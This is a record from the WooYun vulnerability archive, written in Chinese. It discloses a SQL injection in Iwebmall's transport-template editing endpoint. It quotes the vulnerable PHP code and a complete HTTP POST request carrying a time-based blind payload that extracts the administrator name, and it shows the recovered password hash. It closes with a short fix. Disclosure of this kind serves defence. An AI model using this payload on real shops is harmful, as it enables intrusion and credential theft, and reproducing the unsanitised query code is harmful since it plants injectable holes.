{"id": 41856, "wybug_id": "wooyun-2014-087465", "wybug_title": "Iwebmall 最新版SQL注入第十四枚（漏洞打包）", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2014-12-18 11:32", "wybug_open_date": "2015-03-18 11:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebmall 最新版SQL注入第十四枚（漏洞打包） 详细说明：  看到wooyun上有人提了几个iweb的漏洞（ WooYun: iwebmall商城程序sql注入 ），我来捡捡漏儿吧，希望不要重复。先把注入点拿出来：www.xxx.com/do.php?act=edit_transport_template，POST中的参数$id $transport_name  $description存在注入，程序没有对其过滤，造成了注入。先来看看这几个参数可以注入的证明吧\n\n以transport_name 为例进行证明/action/goods/edit_transport_template.php\n无关代码//取得商品列表\t$post = $_POST;\t$id = $post['id'];\t$arr = array();\t$info['transport_name']=$post['transport_name'];\t$info['description'] = $post['description'];\tforeach ($post['transport_type'] as $k=>$v){\t\t$arr[$v]=array();\t}\t//查询开启的配送方式\t$sql = \"select * from $t_transport where ifopen=1\";\t$tran_list=$dbo->getRs($sql);\t\t//循环获得前台传来的值，通过tran_type字段作为数组下标\tforeach ($tran_list as $val){\t\t\t$arr[$val['tranid']]['frist']=$post['frist'.$val['tranid']];\t\t$arr[$val['tranid']]['second']=$post['second'.$val['tranid']];\t\t\t\tif(isset($post['ord_item_dest'.$val['tranid']])){\t\t\tforeach ($post['ord_item_dest'.$val['tranid']] as $k=>$v){\t\t\t\t$v = substr($v,0,-1);\t\t\t\t$areaarr = explode(\",\",$v);\t\t\t\tforeach ($areaarr as $key=>$value){\t\t\t\t\t$arr[$val['tranid']][$value]=array(\"frist\"=>$post['ord_area_frist'.$val['tranid']][$k],\"second\"=>$post['ord_area_second'.$val['tranid']][$k]);\t\t\t\t}\t\t\t}\t\t}\t}\t$info['shop_id']= get_sess_shop_id();\t$info['content'] = serialize($arr);\tif ($dbo->updatebyarr($info,$t_transport_template,\"id='$id'\")) {\t\taction_return(1,$m_langpackage->m_edit_success.\"！\",\"modules.php?app=goods_list\");\t}else{\t\techo \"no\";\t}无关代码\n再去看看updatebyarr()/iweb_mini_lib/cdbex.class.php\npublic  function updatebyarr($info,$table,$con){\t\t$i=0;\t\tforeach ($info as $key=>$value){\t\t\tif ($i==0){\t\t\t\t$change = \"`$key`='$value'\";\t\t\t} else{\t\t\t\t$change .=\",`$key`='$value'\";\t\t\t}\t\t\t$i++;\t\t}\t\t$sql = \"update `$table` set $change where $con\";\t\treturn mysql_query($sql);\t}\n可以看到，$info['transport_name']没有经过任何过滤就带入了SQL语句查询，造成了注入。Iweb没有错误回显，这里用time-based blind进行注入测试。Payload:\nPOST /do.php?act=edit_transport_template HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/modules.php?app=edit_transport_template&id=16Cookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; iweb_hisgoods[15]=1417531949; iweb_hisgoods[26]=1418653330; iweb_email=xxxx@163.com; iweb_iweb_login=xxxx%40163.com; PHPSESSID=l1g8disfqv5ov62d8j0m4msob6Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 257id=16&transport_name=' or (select if(ord(mid((select admin_name from imall_admin_user where admin_id=1 limit 0,1),1,1))=122,sleep(3),0)) or '&description=description&transport_type%5B%5D=1&frist1=10&second1=20&frist2=0.00&second2=0.00&sub=%E7%A1%AE%E5%AE%9A\n测试时：登陆后访问如上的请求，抓包，按上面的payload进行修改即可。因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟5s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： 21232f297a57a5a743894a0e4a801fc3   漏洞证明：  见 详细说明   修复方案：  id:intvaltransport_name:short_check description:short_check   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}